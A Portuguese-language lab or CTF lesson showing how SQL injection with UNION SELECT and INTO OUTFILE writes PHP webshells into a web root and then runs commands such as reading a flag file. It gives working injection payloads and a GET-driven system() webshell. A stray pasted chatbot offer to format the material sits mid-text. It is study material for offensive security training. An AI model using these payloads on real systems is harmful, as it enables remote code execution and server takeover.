## SQL Injection com WebShell

**SQL Injection (WebShell)** é uma falha onde o atacante utiliza a injeção de comandos SQL para executar ações arbitrárias no servidor. Um dos objetivos mais perigosos dessa falha é conseguir **enviar e executar uma WebShell**, o que dá ao atacante controle remoto sobre o servidor comprometido.

Nesta aula, você vai aprender como **identificar**, **explorar** e **mitigar** essa vulnerabilidade.

---

### Entendendo a exploração

Quando encontramos uma falha de SQL Injection, podemos usá-la para **gravar um arquivo PHP malicioso** no servidor — esse arquivo será a nossa **WebShell**. A partir dele, conseguimos obter um **RCE (Remote Code Execution)**, ou seja, executar comandos remotamente no servidor.

A ideia é usar **queries SQL** para gravar conteúdo diretamente em arquivos do servidor. Se conseguirmos isso, podemos gravar um código PHP que permita execução de comandos via navegador.

---

### Por que isso é possível?

Porque é possível usar comandos SQL como este:

```sql
select @@version into outfile '/tmp/test.txt';
```

Esse comando grava o resultado da query em um arquivo no servidor. Se conseguimos fazer isso, podemos escrever **qualquer conteúdo** — inclusive **um script PHP**.

O problema é que, por padrão, **usuários do banco não deveriam ter permissão para criar ou editar arquivos no sistema**. Mas muitas vezes o **administrador da infraestrutura comete erros de configuração**, como deixar o serviço do banco de dados rodando com um usuário que tem permissões de escrita em diretórios do Apache, como `/var/www/html`.
### Por que precisamos criar novos arquivos `.php`?

Uma limitação importante dessa técnica é que **não conseguimos sobrescrever arquivos já existentes** com `INTO OUTFILE`. Ou seja, se o arquivo `opa.php` já existir no diretório, o banco de dados **não vai substituí-lo** — ele simplesmente retorna erro ou ignora a escrita.

Por isso, cada vez que quisermos testar um novo código PHP, **precisamos escolher um nome diferente**, como `opa2.php`, `opa3.php`, e assim por diante.

Esse detalhe é fundamental em labs ou CTFs, pois se você tentar sobrescrever um arquivo existente, **nada vai acontecer e você pode perder tempo achando que o ataque falhou**. O correto é **gerar sempre um arquivo novo com nome diferente** para cada tentativa.

---

Se quiser, posso organizar **seção por seção com todos esses pontos críticos destacados**, ou ainda gerar um material PDF bem formatado com _destaques para essas limitações técnicas_. Deseja isso em um material de apoio?
---

### Verificando número de colunas com `ORDER BY`

Primeiro testamos quantas colunas a query original espera:

```sql
' ORDER BY 1;#
```

Ao testar diferentes números (`ORDER BY 2`, `3`, `4`...), descobrimos que a aplicação trabalha com 4 colunas.

---

### Gravando arquivos com `UNION` e `INTO OUTFILE`

Com isso, podemos usar a técnica `UNION SELECT` para injetar dados e usar o `INTO OUTFILE` para escrever arquivos:

```sql
'' union select 1,2,3,4 into outfile '/var/www/html/opa.php' -- -
```

Esse comando grava um arquivo vazio com conteúdo nas quatro colunas. Não recebemos resposta visível, então testamos acessando a URL:

```
http://10.10.0.7/opa.php
```

---

### Inserindo código PHP

Como não conseguimos sobrescrever arquivos já existentes, precisamos mudar o nome para criar um novo:

```sql
' union select 1,2,3,"<?php system('id'); ?>" into outfile '/var/www/html/opa2.php' -- -
```

Depois acessamos:

```
http://10.10.0.7/opa2.php
```

Se tudo funcionar, o navegador vai mostrar o resultado do comando `id`.

---

### WebShell interativa via GET

Para tornar isso mais flexível, podemos fazer com que a shell leia comandos via `$_GET`:

```sql
' union select 1,2,3,"<?php system($_GET[0]); ?>" into outfile '/var/www/html/opa3.php' -- -
```

Chamamos assim:

```
http://10.10.0.7/opa3.php?0=id
```

E podemos executar comandos, como por exemplo:

```
http://10.10.0.7/opa3.php?0=ls -la /
```

Se encontrarmos o arquivo `flag.txt`, basta usar:

```
http://10.10.0.7/opa3.php?0=cat /flag.txt
```

---

### Observações importantes

- A exploração **só funciona se o usuário do banco tiver permissão para gravar arquivos** — o que é uma falha de configuração.
    
- O PHP precisa estar ativado no Apache para que o código seja executado.
    
- O atacante **não consegue sobrescrever arquivos**, apenas criar novos.
    
- Essa técnica é útil em **ambientes de CTF e testes de laboratório**, mas em produção é uma **falha crítica de segurança**.
